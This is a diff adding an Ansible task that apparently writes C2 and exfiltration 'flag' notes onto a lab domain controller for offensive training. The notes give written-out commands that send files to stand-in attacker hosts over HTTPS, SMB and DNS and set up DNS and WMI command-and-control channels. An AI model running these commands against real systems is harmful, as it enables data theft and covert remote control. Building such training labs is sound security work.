@@ -1,0 +1,109 @@
+---
+# ==============================================================================
+# vuln_defense_evasion/tasks/c2_exfil.yml — DEF-061..080, C2-001..030, EXF-001..030
+# Target: dc01.corp.local (note drops only — configuration is network-level)
+# ==============================================================================
+
+- name: DEF/C2/EXF - Drop C2 framework surface notes
+  ansible.windows.win_copy:
+    dest: "{{ item.path }}"
+    content: "{{ item.content }}"
+  loop:
+    - path: 'C:\Flags\FLAG-C2-001-DNS-Tunnel.txt'
+      content: |
+        C2-001: DNS Tunneling C2 Channel
+        ==================================
+        DNS is allowed outbound on all lab machines (port 53/UDP+TCP).
+        No DNS filtering or inspection is configured.
+
+        C2 frameworks with DNS transport:
+          - Cobalt Strike: DNS Beacon (A/AAAA/CNAME queries)
+          - DNScat2: bidirectional DNS tunnel
+          - iodine: IP-over-DNS tunnel
+
+        Setup:
+          iodine -f -P password attacker_tunnel_ip tunnel.attacker.com
+          python3 dnscat2.py tunnel.attacker.com
+
+    - path: 'C:\Flags\FLAG-C2-002-HTTPS-C2.txt'
+      content: |
+        C2-002: HTTPS C2 (Port 443 outbound)
+        =====================================
+        HTTPS is allowed outbound on all lab machines.
+        No SSL inspection is configured (Defender disabled).
+
+        C2 frameworks:
+          - Cobalt Strike HTTPS listener (malleable C2 profile)
+          - Sliver: HTTPS implant (github.com/BishopFox/sliver)
+          - Havoc: HTTPS demon agent
+          - Metasploit: meterpreter/reverse_https
+
+        Certificate: self-signed or Let's Encrypt (trusted by default)
+        User-agent blending: appear as legitimate Chrome/Edge traffic
+
+    - path: 'C:\Flags\FLAG-C2-010-WMI-C2.txt'
+      content: |
+        C2-010: WMI-based C2 (Fileless)
+        ==================================
+        WMI event subscriptions (set by PER-006 in vuln_persistence_ext) can serve
+        as a fileless C2 transport. Commands sent via WMI property values.
+
+        Frameworks:
+          - WMImplant (PowerShell WMI C2)
+          - WMIHACKER (WMI lateral movement)
+
+        Example:
+          Set-WmiInstance -Namespace root\cimv2 -Class __Namespace -Arguments @{Name='cmd_<base64>'}
+          → Target polls WMI namespace, decodes + executes
+
+    - path: 'C:\Flags\FLAG-EXF-001-SMB-Exfil.txt'
+      content: |
+        EXF-001: Data Exfiltration via SMB
+        =====================================
+        SMB is used for legitimate file transfers. Exfil blends in.
+
+        Methods:
+          # Copy to attacker SMB share (no egress filtering)
+          net use \\attacker_ip\share /user:attacker Password
+          copy C:\sensitive_data.zip \\attacker_ip\share\
+
+          # Cobalt Strike: upload command
+          # Impacket: smbclient
+
+        Detection: Unusual outbound port 445 traffic (blocked in most prod envs).
+        Lab: No outbound filtering — SMB exfil works from all VMs.
+
+    - path: 'C:\Flags\FLAG-EXF-010-HTTPS-Exfil.txt'
+      content: |
+        EXF-010: Data Exfiltration via HTTPS (HTTP POST)
+        ==================================================
+        HTTPS POST requests to attacker-controlled domain blend with normal traffic.
+
+        Tools:
+          # PowerShell
+          Invoke-WebRequest -Uri https://attacker.com/upload -Method POST \
+            -Body (Get-Content C:\data.zip -Raw) -ContentType "application/octet-stream"
+
+          # curl equivalent
+          curl -X POST https://attacker.com/upload --data-binary @C:\data.zip
+
+          # exfiltrate to Pastebin/cloud storage (appears legitimate):
+          Invoke-RestMethod -Uri https://pastbin.com/api_post -Method POST \
+            -Body @{api_paste_code=(Get-Content C:\data.txt | Out-String)}
+
+    - path: 'C:\Flags\FLAG-EXF-020-DNS-Exfil.txt'
+      content: |
+        EXF-020: Data Exfiltration via DNS
+        =====================================
+        DNS queries exfiltrate data as subdomains (bypasses most egress filters).
+
+        Methods:
+          # Encode data in DNS labels (63 chars each)
+          nslookup $(certutil -encode data.txt | tr -d '\n' | cut -c1-60).exfil.attacker.com
+
+          # dnscat2 automatic exfil:
+          dnscat2 --secret=password attacker.com
+          dnscat2> download C:\sensitive.zip
+
+          # DNSExfiltrator:
+          python3 dnsexfiltrator.py -d exfil.attacker.com -f C:\sensitive.zip -p password
